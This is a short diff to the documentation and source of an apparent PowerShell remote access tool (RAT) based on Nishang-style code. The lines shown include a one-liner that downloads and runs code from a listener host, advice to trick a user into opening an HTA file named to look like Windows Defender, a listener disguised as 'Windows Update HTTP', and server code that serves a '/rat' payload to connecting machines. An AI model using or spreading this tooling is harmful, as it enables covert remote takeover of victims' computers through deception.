@@ -12,7 +12,8 @@ iex (New-Object Net.WebClient).DownloadString("http://ListenerIPAddress/connect"
 
 or trick a user in connecting to: http://ListenerIPAddress/WindowsDefender.hta
 
-The listener opens incoming traffic on the specified port by the name of "Windows Update HTTP".
+The listener opens incoming traffic on the specified port by the name of "Windows Update HTTP". The listener needs to be run from
+an elevated PowerShell session.
 
 The script has been originally written by Casey Smith (@subTee)
 
@@ -83,7 +84,7 @@ https://github.com/samratashok/nishang
 	        #Use this for One-Liner Start
 	        if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
             {  
-             #write-host "Host Connected" -fore Cyan
+
             $message = "
 		            			
                             `$s = `"http://$IPAddress`:$Port/rat`"
